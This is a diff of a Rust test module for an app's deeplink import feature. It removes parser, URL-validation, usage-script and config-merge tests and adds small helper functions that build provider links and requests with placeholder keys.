@@ -3,471 +3,53 @@
 use super::mcp::parse_mcp_apps;
 use super::parser::parse_deeplink_url;
 use super::prompt::import_prompt_from_deeplink;
-use super::provider::parse_and_merge_config;
+use super::provider::{build_provider_from_request, parse_and_merge_config};
 use super::utils::{infer_homepage_from_endpoint, validate_url};
 use super::DeepLinkImportRequest;
+use crate::app_config::McpApps;
 use crate::provider::UsageScript;
 use crate::test_support::{EnvVars, TempUserHome};
 use crate::AppType;
 use crate::{store::AppState, Database};
 use base64::prelude::*;
-use std::{env, sync::Arc};
+use serde_json::json;
+use std::sync::Arc;
 
 // =============================================================================
-// Parser Tests
+// Helpers
 // =============================================================================
 
-#[test]
-fn test_parse_valid_claude_deeplink() {
-    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test%20Provider&homepage=https%3A%2F%2Fexample.com&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test-123&icon=claude";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(request.version, "v1");
-    assert_eq!(request.resource, "provider");
-    assert_eq!(request.app, Some("claude".to_string()));
-    assert_eq!(request.name, Some("Test Provider".to_string()));
-    assert_eq!(request.homepage, Some("https://example.com".to_string()));
-    assert_eq!(
-        request.endpoint,
-        Some("https://api.example.com".to_string())
+fn provider_link(app: &str, api_format: Option<&str>) -> String {
+    let mut url = format!(
+        "ccswitch://v1/import?resource=provider&app={app}&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test&model=example-model"
     );
-    assert_eq!(request.api_key, Some("sk-test-123".to_string()));
-    assert_eq!(request.icon, Some("claude".to_string()));
-}
-
-#[test]
-fn test_parse_deeplink_drops_icon_that_is_not_a_builtin_name() {
-    let base = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test";
-
-    // 大小写和空白照旧归一
-    let request = parse_deeplink_url(&format!("{base}&icon=%20DeepSeek%20")).unwrap();
-    assert_eq!(request.icon, Some("deepseek".to_string()));
-
-    // data URI、外链地址都不是图标名：丢掉，链接本身照常解析
-    for icon in [
-        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
-        "https%3A%2F%2Fexample.com%2Flogo.png",
-        "%3Csvg%3E",
-    ] {
-        let request = parse_deeplink_url(&format!("{base}&icon={icon}")).unwrap();
-        assert_eq!(request.icon, None, "{icon}");
+    if let Some(format) = api_format {
+        url.push_str(&format!("&apiFormat={format}"));
     }
+    url
 }
 
-#[test]
-fn test_parse_deeplink_keeps_only_allowed_icon_urls() {
-    let base = "ccswitch://v1/import?resource=provider&app=claude&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk-test&icon=deepseek";
-
-    let request = parse_deeplink_url(&format!(
-        "{base}&iconUrl=https%3A%2F%2Fcdn.example.com%2Flogo.svg"
-    ))
-    .unwrap();
-    assert_eq!(
-        request.icon_url.as_deref(),
-        Some("https://cdn.example.com/logo.svg")
-    );
-    // 内置图标照常保留，下载失败时用它
-    assert_eq!(request.icon.as_deref(), Some("deepseek"));
-
-    // http、IP、内网主机名、带端口：丢掉，链接本身照常解析
-    for url in [
-        "http%3A%2F%2Fexample.com%2Flogo.png",
-        "https%3A%2F%2F127.0.0.1%2Flogo.png",
-        "https%3A%2F%2F%5B%3A%3A1%5D%2Flogo.png",
-        "https%3A%2F%2Flocalhost%2Flogo.png",
-        "https%3A%2F%2Fexample.com%3A8080%2Flogo.png",
-        "data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgo%3D",
-    ] {
-        let request = parse_deeplink_url(&format!("{base}&iconUrl={url}")).unwrap();
-        assert_eq!(request.icon_url, None, "{url}");
-    }
+fn build_from_link(app: &str, api_format: Option<&str>) -> crate::provider::Provider {
+    let request = parse_deeplink_url(&provider_link(app, api_format)).expect("parse link");
+    let app_type: AppType = app.parse().expect("app type");
+    build_provider_from_request(&app_type, &request).expect("build provider")
 }
 
-#[test]
-fn test_parse_deeplink_with_notes() {
-    let url = "ccswitch://v1/import?resource=provider&app=codex&name=Codex&homepage=https%3A%2F%2Fcodex.com&endpoint=https%3A%2F%2Fapi.codex.com&apiKey=key123&notes=Test%20notes";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(request.notes, Some("Test notes".to_string()));
+fn link_with(app: &str, param: &str, raw_value: &str) -> String {
+    let base = provider_link(app, None);
+    let value: String = url::form_urlencoded::byte_serialize(raw_value.as_bytes()).collect();
+    // provider_link 已带 endpoint / apiKey / model，替换掉同名参数
+    let mut url = url::Url::parse(&base).unwrap();
+    let pairs: Vec<(String, String)> = url
+        .query_pairs()
+        .filter(|(key, _)| key != param)
+        .map(|(key, value)| (key.into_owned(), value.into_owned()))
+        .collect();
+    url.query_pairs_mut().clear().extend_pairs(pairs);
+    format!("{url}&{param}={value}")
 }
 
-#[test]
-fn pi_provider_link_without_a_model_is_rejected_up_front() {
-    let url = "ccswitch://v1/import?resource=provider&app=pi&name=Pi&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=sk-test";
-    let err = parse_deeplink_url(url).expect_err("a Pi node without models is unusable");
-    assert!(err.to_string().contains("model"), "{err}");
-}
-
-#[test]
-fn test_parse_grokbuild_provider() {
-    use super::provider::build_provider_from_request;
-
-    let url = "ccswitch://v1/import?resource=provider&app=grokbuild&name=Grok%20Relay&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&apiKey=secret&model=grok-4.5";
-
-    let request = parse_deeplink_url(url).unwrap();
-
-    assert_eq!(request.app.as_deref(), Some("grokbuild"));
-    assert_eq!(request.name.as_deref(), Some("Grok Relay"));
-    assert_eq!(
-        request.endpoint.as_deref(),
-        Some("https://api.example.com/v1")
-    );
-    assert_eq!(request.api_key.as_deref(), Some("secret"));
-    assert_eq!(request.model.as_deref(), Some("grok-4.5"));
-
-    let provider = build_provider_from_request(&AppType::GrokBuild, &request).unwrap();
-    let config = provider.settings_config["config"].as_str().unwrap();
-    let document = config.parse::<toml::Value>().unwrap();
-    let model = &document["model"]["grok-4.5"];
-
-    assert_eq!(document["models"]["default"].as_str(), Some("grok-4.5"));
-    assert_eq!(
-        model["base_url"].as_str(),
-        Some("https://api.example.com/v1")
-    );
-    assert_eq!(model["name"].as_str(), Some("Grok Relay"));
-    assert_eq!(model["api_key"].as_str(), Some("secret"));
-    assert_eq!(model["api_backend"].as_str(), Some("responses"));
-    assert_eq!(model["context_window"].as_integer(), Some(500_000));
-}
-
-#[test]
-fn parse_rejects_malformed_deeplinks() {
-    for (case, input, error) in [
-        (
-            "test_parse_invalid_scheme",
-            "https://v1/import?resource=provider&app=claude&name=Test",
-            "Invalid scheme",
-        ),
-        (
-            "test_parse_unsupported_version",
-            "ccswitch://v2/import?resource=provider&app=claude&name=Test",
-            "Unsupported protocol version",
-        ),
-        // Name is still required even in v3.8+ (only homepage/endpoint/apiKey are optional)
-        (
-            "test_parse_missing_required_field",
-            "ccswitch://v1/import?resource=provider&app=claude",
-            "Missing 'name' parameter",
-        ),
-    ] {
-        let url = input;
-
-        let result = parse_deeplink_url(url);
-        assert!(result.is_err(), "{case}");
-        assert!(result.unwrap_err().to_string().contains(error), "{case}");
-    }
-}
-
-/// configUrl 没实现，必须在解析阶段就报错：放行的话，用户点了确认导入才失败
-#[test]
-fn test_parse_rejects_config_url_up_front() {
-    let url = "ccswitch://v1/import?resource=provider&app=claude&name=Test&configUrl=https%3A%2F%2Fexample.com%2Fc.json";
-
-    let err = parse_deeplink_url(url).unwrap_err();
-    assert!(err.to_string().contains("configUrl"), "{err}");
-}
-
-/// 下游 parse_mcp_apps 与 McpService 都支持 Pi / MiniMax Code / Oh My Pi，解析层不能先把它们拦掉
-#[test]
-fn test_parse_mcp_deeplink_accepts_pi_mcode_and_omp() {
-    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
-    let url = format!("ccswitch://v1/import?resource=mcp&apps=claude,pi,mcode,omp&config={config}");
-
-    let request = parse_deeplink_url(&url).expect("pi, mcode and ohmpi are valid MCP targets");
-    let apps = parse_mcp_apps(request.apps.as_deref().unwrap()).unwrap();
-    assert!(apps.claude && apps.pi && apps.mcode && apps.omp);
-}
-
-/// DeepSeek Harness 的 MCP 链接写进 DSH 的标记（Web 与 Desktop 共用）
-#[test]
-fn test_parse_mcp_deeplink_accepts_zcode() {
-    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
-    for apps in ["zcode", "claude,zcode"] {
-        let url = format!("ccswitch://v1/import?resource=mcp&apps={apps}&config={config}");
-        let request = parse_deeplink_url(&url).expect("zcode is a valid MCP target");
-        assert!(
-            parse_mcp_apps(request.apps.as_deref().unwrap())
-                .unwrap()
-                .zcode
-        );
-    }
-}
-
-#[test]
-fn test_parse_mcp_deeplink_accepts_dsh() {
-    let config = BASE64_URL_SAFE_NO_PAD.encode(r#"{"mcpServers":{"fetch":{"command":"uvx"}}}"#);
-    for apps in ["dsh", "claude,dsh"] {
-        let url = format!("ccswitch://v1/import?resource=mcp&apps={apps}&config={config}");
-        let request = parse_deeplink_url(&url).expect("dsh is a valid MCP target");
-        assert!(
-            parse_mcp_apps(request.apps.as_deref().unwrap())
-                .unwrap()
-                .dsh
-        );
-    }
-}
-
-/// 供应商链接对 Oh My Pi 明确拒绝，而不是落到「Invalid provider app type」。
-#[test]
-fn test_parse_provider_deeplink_accepts_the_pi_family_apps_with_a_model() {
-    for app in ["mcode", "kimi", "dsh", "omp", "workbuddy", "zcode"] {
-        let request = parse_deeplink_url(&provider_link(app, None))
-            .unwrap_or_else(|err| panic!("{app} link should parse: {err}"));
-        assert_eq!(request.app.as_deref(), Some(app));
-
-        let url = format!(
-            "ccswitch://v1/import?resource=provider&app={app}&name=Test&endpoint=https%3A%2F%2Fapi.example.com&apiKey=sk"
-        );
-        let err = parse_deeplink_url(&url).expect_err("a node without models is unusable");
-        assert!(err.to_string().contains("model"), "{app}: {err}");
-    }
-}
-
-#[test]
-fn test_parse_prompt_deeplink_accepts_mcode() {
-    let url = "ccswitch://v1/import?resource=prompt&app=mcode&name=Rules&content=IyBoaQ%3D%3D";
-
-    let request = parse_deeplink_url(url).expect("MiniMax Code has a prompt panel");
-    assert_eq!(request.app.as_deref(), Some("mcode"));
-}
-
-/// 读取不清除，按编号确认才清除：前端读到后、显示前被打断（effect 重建、窗口销毁），
-/// 下次读取仍能拿到；期间来了新链接，迟到的旧确认不能把新链接清掉
-#[test]
-#[serial_test::serial]
-fn test_pending_deeplink_survives_peek_and_clears_only_on_matching_ack() {
-    use super::{
-        ack_pending_deeplink, peek_pending_deeplink, set_pending_deeplink, PendingDeepLink,
-    };
-
-    let link = |name: &str| PendingDeepLink::Import {
-        request: Box::new(
-            parse_deeplink_url(&format!(
-                "ccswitch://v1/import?resource=provider&app=claude&name={name}"
-            ))
-            .expect("valid link"),
-        ),
-    };
-
-    set_pending_deeplink(link("A"));
-    let first = peek_pending_deeplink().expect("pending link");
-    let json = serde_json::to_value(&first).unwrap();
-    assert_eq!(json["link"]["kind"], "import");
-    assert_eq!(json["link"]["request"]["name"], "A");
-    assert_eq!(
-        peek_pending_deeplink().map(|entry| entry.id),
-        Some(first.id),
-        "peek must not clear the link"
-    );
-
-    set_pending_deeplink(link("B"));
-    ack_pending_deeplink(first.id);
-    let second = peek_pending_deeplink().expect("a stale ack must not clear the newer link");
-    assert_ne!(second.id, first.id);
-
-    ack_pending_deeplink(second.id);
-    assert!(peek_pending_deeplink().is_none());
-}
-
-// =============================================================================
-// Utils Tests
-// =============================================================================
-
-#[test]
-fn test_validate_invalid_url() {
-    let result = validate_url("not-a-url", "test");
-    assert!(result.is_err());
-}
-
-#[test]
-fn test_validate_invalid_scheme() {
-    let result = validate_url("ftp://example.com", "test");
-    assert!(result.is_err());
-    assert!(result
-        .unwrap_err()
-        .to_string()
-        .contains("must be http or https"));
-}
-
-#[test]
-fn test_infer_homepage() {
-    assert_eq!(
-        infer_homepage_from_endpoint("https://api.anthropic.com/v1"),
-        Some("https://anthropic.com".to_string())
-    );
-    assert_eq!(
-        infer_homepage_from_endpoint("https://api-test.company.com/v1"),
-        Some("https://test.company.com".to_string())
-    );
-    assert_eq!(
-        infer_homepage_from_endpoint("https://example.com"),
-        Some("https://example.com".to_string())
-    );
-}
-
-// =============================================================================
-// Provider Tests
-// =============================================================================
-
-#[test]
-fn test_build_gemini_provider_with_model() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("gemini".to_string()),
-        name: Some("Test Gemini".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("test-api-key".to_string()),
-        icon: None,
-        model: Some("gemini-2.0-flash".to_string()),
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();
-
-    // Verify provider basic info
-    assert_eq!(provider.name, "Test Gemini");
-    assert_eq!(
-        provider.website_url,
-        Some("https://example.com".to_string())
-    );
-
-    // Verify settings_config structure
-    let env = provider.settings_config["env"].as_object().unwrap();
-    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
-    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
-    assert_eq!(env["GEMINI_MODEL"], "gemini-2.0-flash");
-}
-
-#[test]
-fn test_build_gemini_provider_without_model() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("gemini".to_string()),
-        name: Some("Test Gemini".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("test-api-key".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Gemini, &request).unwrap();
-
-    let env = provider.settings_config["env"].as_object().unwrap();
-    assert_eq!(env["GEMINI_API_KEY"], "test-api-key");
-    assert_eq!(env["GOOGLE_GEMINI_BASE_URL"], "https://api.example.com");
-    // Model should not be present
-    assert!(env.get("GEMINI_MODEL").is_none());
-}
-
-#[test]
-fn test_deeplink_usage_script_does_not_copy_provider_credentials() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Test Claude".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com/v1/".to_string()),
-        api_key: Some("sk-main".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: Some(true),
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should be created");
-
-    assert!(script.enabled);
-    assert_eq!(script.api_key, None);
-    assert_eq!(script.base_url, None);
-}
-
-/// 构造一个只带用量脚本字段的 provider 请求，其余保持最小。
-fn usage_script_request(code: &str, usage_enabled: Option<bool>) -> DeepLinkImportRequest {
+fn claude_provider_request() -> DeepLinkImportRequest {
     DeepLinkImportRequest {
         version: "v1".to_string(),
         resource: "provider".to_string(),
@@ -476,723 +58,19 @@ fn usage_script_request(code: &str, usage_enabled: Option<bool>) -> DeepLinkImpo
         homepage: Some("https://example.com".to_string()),
         endpoint: Some("https://api.example.com/v1/".to_string()),
         api_key: Some("sk-main".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled,
-        usage_script: Some(BASE64_STANDARD.encode(code)),
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
+        ..Default::default()
     }
 }
 
-#[test]
-fn test_deeplink_usage_script_is_enabled_by_default_when_the_link_carries_code() {
-    use super::provider::build_provider_from_request;
-
-    // 站长放脚本就是为了让用户看到余额；链接没写 usageEnabled 时，带了脚本即启用。
-    // 前端确认框的「已启用」徽章按同一规则显示。
-    let code = "export async function query() { return { cost: 0 }; }";
-    let request = usage_script_request(code, None);
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should be created");
-
-    assert!(script.enabled, "带了脚本、没写 usageEnabled 时应默认启用");
-    assert_eq!(script.code, code);
-}
-
-#[test]
-fn test_deeplink_usage_script_stays_disabled_when_the_link_opts_out() {
-    use super::provider::build_provider_from_request;
-
-    let code = "export async function query() { return { cost: 0 }; }";
-    let request = usage_script_request(code, Some(false));
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should still be created");
-
-    assert!(!script.enabled, "usageEnabled=false 必须照办");
-    // 代码仍要保留：用户之后可在应用内手动开启。
-    assert_eq!(script.code, code);
-}
-
-#[test]
-fn test_deeplink_usage_fields_without_a_script_are_not_enabled_by_default() {
-    use super::provider::build_provider_from_request;
-
-    // 没有脚本就没有东西可跑：只带凭据类字段的链接不应默认启用。
-    let mut request = usage_script_request("", None);
-    request.usage_script = None;
-    request.usage_access_token = Some("token".to_string());
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage fields should still be stored");
-
-    assert!(!script.enabled);
-}
-
-#[test]
-fn test_deeplink_usage_script_honors_an_explicit_enable_request_from_the_link() {
-    use super::provider::build_provider_from_request;
-
-    // `usageEnabled=true` 是**链接作者**的请求，不是用户的选择——用户的同意体现在
-    // 看过确认框里完整的脚本正文与启用状态之后点了导入。
-    let code = "export async function query() { return { cost: 0 }; }";
-    let request = usage_script_request(code, Some(true));
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should be created");
-
-    assert!(script.enabled);
-    assert_eq!(script.code, code);
-}
-
-#[test]
-fn test_deeplink_usage_script_omits_explicit_credentials_that_match_provider() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Test Claude".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com/v1/".to_string()),
-        api_key: Some("sk-main".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: Some(true),
-        usage_script: None,
-        usage_api_key: Some(" sk-main ".to_string()),
-        usage_base_url: Some(" https://api.example.com/v1/ ".to_string()),
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should be created");
-
-    assert_eq!(script.api_key, None);
-    assert_eq!(script.base_url, None);
-}
-
-#[test]
-fn test_deeplink_usage_script_preserves_distinct_usage_credentials() {
-    use super::provider::build_provider_from_request;
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Test Claude".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com/v1".to_string()),
-        api_key: Some("sk-main".to_string()),
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: None,
-        config_format: None,
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: Some(true),
-        usage_script: None,
-        usage_api_key: Some(" sk-usage ".to_string()),
-        usage_base_url: Some(" https://usage.example/api/ ".to_string()),
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let script = provider
-        .meta
-        .as_ref()
-        .and_then(|meta| meta.usage_script.as_ref())
-        .expect("usage script should be created");
-
-    assert_eq!(script.api_key.as_deref(), Some("sk-usage"));
-    assert_eq!(
-        script.base_url.as_deref(),
-        Some("https://usage.example/api")
-    );
-}
-
-#[test]
-fn test_parse_and_merge_config_claude() {
-    // Prepare Base64 encoded Claude config
-    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1","ANTHROPIC_MODEL":"claude-sonnet-4.5"}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Test".to_string()),
-        homepage: None,
-        endpoint: None,
-        api_key: None,
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: Some(config_b64),
-        config_format: Some("json".to_string()),
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let merged = parse_and_merge_config(&request).unwrap();
-
-    // Should auto-fill from config
-    assert_eq!(merged.api_key, Some("sk-ant-xxx".to_string()));
-    assert_eq!(
-        merged.endpoint,
-        Some("https://api.anthropic.com/v1".to_string())
-    );
-    assert_eq!(merged.homepage, Some("https://anthropic.com".to_string()));
-    assert_eq!(merged.model, Some("claude-sonnet-4.5".to_string()));
-}
-
-#[test]
-fn test_parse_and_merge_config_codex_uses_bearer_token() {
-    let config_toml = r#"model_provider = "rightcode"
-model = "gpt-5-codex"
-
-[model_providers.rightcode]
-base_url = "https://rightcode.example/v1"
-wire_api = "responses"
-experimental_bearer_token = "sk-rightcode"
-"#;
-    let config_json = serde_json::json!({
-        "auth": {},
-        "config": config_toml,
-    })
-    .to_string();
-    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("codex".to_string()),
-        name: Some("RightCode".to_string()),
-        config: Some(config_b64),
-        config_format: Some("json".to_string()),
-        ..Default::default()
-    };
-
-    let merged = parse_and_merge_config(&request).unwrap();
-
-    assert_eq!(merged.api_key, Some("sk-rightcode".to_string()));
-    assert_eq!(
-        merged.endpoint,
-        Some("https://rightcode.example/v1".to_string())
-    );
-    assert_eq!(
-        merged.homepage,
-        Some("https://rightcode.example".to_string())
-    );
-    assert_eq!(merged.model, Some("gpt-5-codex".to_string()));
-}
-
-#[test]
-fn test_parse_and_merge_config_grokbuild() {
-    let config_toml = r#"[models]
-default = "grok-profile"
-
-[model."grok-profile"]
-model = "grok-upstream"
-base_url = "https://grok.example/v1"
-name = "Grok Relay"
-api_key = "sk-grok"
-api_backend = "responses"
-context_window = 500000
-"#;
-    let config_json = serde_json::json!({ "config": config_toml }).to_string();
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("grokbuild".to_string()),
-        name: Some("Grok Relay".to_string()),
-        config: Some(BASE64_STANDARD.encode(config_json.as_bytes())),
-        config_format: Some("json".to_string()),
-        ..Default::default()
-    };
-
-    let merged = parse_and_merge_config(&request).expect("merge Grok Build config");
-
-    assert_eq!(merged.api_key.as_deref(), Some("sk-grok"));
-    assert_eq!(merged.endpoint.as_deref(), Some("https://grok.example/v1"));
-    assert_eq!(merged.model.as_deref(), Some("grok-upstream"));
-    assert_eq!(merged.homepage.as_deref(), Some("https://grok.example"));
-}
-
-#[test]
-fn test_parse_and_merge_config_url_override() {
-    let config_json = r#"{"env":{"ANTHROPIC_AUTH_TOKEN":"sk-old","ANTHROPIC_BASE_URL":"https://api.anthropic.com/v1"}}"#;
-    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("Test".to_string()),
-        homepage: None,
-        endpoint: None,
-        api_key: Some("sk-new".to_string()), // URL param should override
-        icon: None,
-        model: None,
-        notes: None,
-        haiku_model: None,
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: Some(config_b64),
-        config_format: Some("json".to_string()),
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let merged = parse_and_merge_config(&request).unwrap();
-
-    // URL param should take priority
-    assert_eq!(merged.api_key, Some("sk-new".to_string()));
-    // Config file value should be used
-    assert_eq!(
-        merged.endpoint,
-        Some("https://api.anthropic.com/v1".to_string())
-    );
-}
-
-#[test]
-fn test_build_claude_provider_preserves_custom_env_fields() {
-    // Regression test for: deeplink import dropped non-standard env fields
-    // such as ANTHROPIC_CUSTOM_HEADERS, even though the preview dialog
-    // showed them. The preview and the actual persisted provider must
-    // contain the same env keys.
-    use super::provider::build_provider_from_request;
-
-    let config_json = r#"{"env":{
-        "ANTHROPIC_AUTH_TOKEN":"sk-ant-xxx",
-        "ANTHROPIC_BASE_URL":"https://api.example.com",
-        "ANTHROPIC_CUSTOM_HEADERS":"Cookie: session=abc",
-        "API_TIMEOUT_MS":"3000000",
-        "CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS":"1",
-        "ANTHROPIC_DEFAULT_HAIKU_MODEL":"haiku-from-config"
-    }}"#;
-    let config_b64 = BASE64_STANDARD.encode(config_json.as_bytes());
-
-    let request = DeepLinkImportRequest {
-        version: "v1".to_string(),
-        resource: "provider".to_string(),
-        app: Some("claude".to_string()),
-        name: Some("My Provider".to_string()),
-        homepage: Some("https://example.com".to_string()),
-        endpoint: Some("https://api.example.com".to_string()),
-        api_key: Some("sk-ant-xxx".to_string()),
-        icon: None,
-        // URL param: must win over the same key in config (haiku-from-config)
-        model: Some("main-model".to_string()),
-        notes: None,
-        haiku_model: Some("haiku-from-url".to_string()),
-        sonnet_model: None,
-        opus_model: None,
-        api_format: None,
-        config: Some(config_b64),
-        config_format: Some("json".to_string()),
-        config_url: None,
-        icon_url: None,
-        apps: None,
-        repo: None,
-        directory: None,
-        branch: None,
-        content: None,
-        description: None,
-        enabled: None,
-        usage_enabled: None,
-        usage_script: None,
-        usage_api_key: None,
-        usage_base_url: None,
-        usage_access_token: None,
-        usage_user_id: None,
-        usage_auto_interval: None,
-    };
-
-    let provider = build_provider_from_request(&AppType::Claude, &request).unwrap();
-    let env = provider.settings_config["env"].as_object().unwrap();
-
-    // Custom env fields from `config` must survive import
-    assert_eq!(env["ANTHROPIC_CUSTOM_HEADERS"], "Cookie: session=abc");
-    assert_eq!(env["API_TIMEOUT_MS"], "3000000");
-    assert_eq!(env["CLAUDE_CODE_DISABLE_EXPERIMENTAL_BETAS"], "1");
-
-    // Standard fields from URL params win over config
-    assert_eq!(env["ANTHROPIC_AUTH_TOKEN"], "sk-ant-xxx");
-    assert_eq!(env["ANTHROPIC_BASE_URL"], "https://api.example.com");
-    assert_eq!(env["ANTHROPIC_MODEL"], "main-model");
-    assert_eq!(env["ANTHROPIC_DEFAULT_HAIKU_MODEL"], "haiku-from-url");
-}
-
